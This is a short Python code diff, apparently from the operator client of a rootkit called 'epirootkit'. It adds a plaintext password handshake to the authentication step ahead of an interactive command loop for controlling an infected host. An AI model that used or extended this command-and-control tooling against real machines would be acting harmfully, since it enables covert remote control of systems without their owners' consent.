@@ -11,8 +11,22 @@ def xor(data: bytes) -> bytes:
 
 def handle_client(client):
     try:
+        # Envoyer le mot de passe en clair à la connexion
+        client.sendall(b"epirookit\n")
+
+        # Afficher la réponse AUTH OK / FAIL
+        auth_response = client.recv(2048)
+        print("--- AUTH ---")
+        print(auth_response.decode(errors="ignore"))
+        print("------------\n")
+
+        if b"FAIL" in auth_response:
+            print("Authentication failed. Exiting.")
+            return
+
         while True:
             cmd = input("epirootkit> ").strip()
+
             if not cmd:
                 continue
 
